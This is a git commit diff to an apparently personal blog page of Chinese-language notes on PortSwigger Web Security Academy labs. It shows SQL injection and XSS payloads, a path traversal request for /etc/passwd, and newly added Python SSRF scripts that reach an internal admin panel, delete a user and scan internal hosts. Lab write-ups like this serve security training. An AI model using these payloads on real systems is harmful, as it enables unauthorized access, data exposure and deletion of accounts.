e5f5a470aab2ad5bf650642f2ebb7d44b68f432d
1kuzus <revenge.1kuzus@outlook.com>
2024-11-29 19:56:06 +0800

    update posts

--- src/app/(posts)/longtime/wp-portswigger/page.js
+++ src/app/(posts)/longtime/wp-portswigger/page.js
@@ -16,7 +16,7 @@ export default function Post() {
             <X.P>构造`payload`为`Gifts' or 1=1 --`，输入URL`/filter?category=Gifts%27%20or%201=1%20--`。</X.P>
             <X.H2>Ap: SQL injection vulnerability allowing login bypass</X.H2>
             <X.P>直接用用户名`administrator' --`；或用户名`administrator`，密码`1' or 1=1 --`。</X.P>
-            <X.H1>Cross-site scripting (XSS)</X.H1>
+            <X.H1>XSS: Cross-site scripting</X.H1>
             <X.H2>笔记</X.H2>
             <X.Uli>`document.write`和`innerHTML`：`innerHTML`写入的`script`标签不会被解析执行；`document.write`会直接将内容插入文档流，写入的`script`标签会被执行。对于`innerHTML`的情况可以考虑使用{'`<img src=0 onerror="alert(0)">`'}。</X.Uli>
             <X.H2>Ap: Reflected XSS into HTML context with nothing encoded</X.H2>
@@ -64,6 +64,36 @@ export default function Post() {
                 `}
             />
             <X.P>注入点是`a`标签的`href`，`payload`为`javascript:alert(0)`。输入URL`/feedback?returnPath=javascript:alert(0)`，然后点击这个`a`标签。</X.P>
+            <X.H1>SSRF: Server-side request forgery</X.H1>
+            <X.H2>Ap: Basic SSRF against the local server</X.H2>
+            <X.P>根据提示，发送请求：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import requests
+
+                url = "https://0aaf00c7049bf8f4805d26ba00c90059.web-security-academy.net/product/stock"
+                stockApi = "http://localhost/admin"
+                resp = requests.post(url, data={"stockApi": stockApi})
+                print(resp.text)
+                `}
+            />
+            <X.P>在返回中看到{'`<a href="/admin/delete?username=carlos">Delete</a>`'}，再次发送对`/admin/delete?username=carlos`的请求即可。</X.P>
+            <X.H2>Ap: Basic SSRF against another back-end system</X.H2>
+            <X.P>根据提示扫描端口：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import requests
+
+                url = "https://0aee006003dd23eb8589365a00810071.web-security-academy.net/product/stock"
+                for x in range(255):
+                    stockApi = f"http://192.168.0.{x}:8080/admin"
+                    resp = requests.post(url, data={"stockApi": stockApi})
+                    print(x, resp.status_code)
+                `}
+            />
+            <X.P>`192.168.0.13:8080/admin`返回`200`。删除用户同上。</X.P>
             <X.H1>Path traversal</X.H1>
             <X.H2>Ap: File path traversal, simple case</X.H2>
             <X.P>随便检查一个图片，地址为`/image?filename=23.jpg`，改为`/txt?filename=../../../etc/passwd`即可。</X.P>
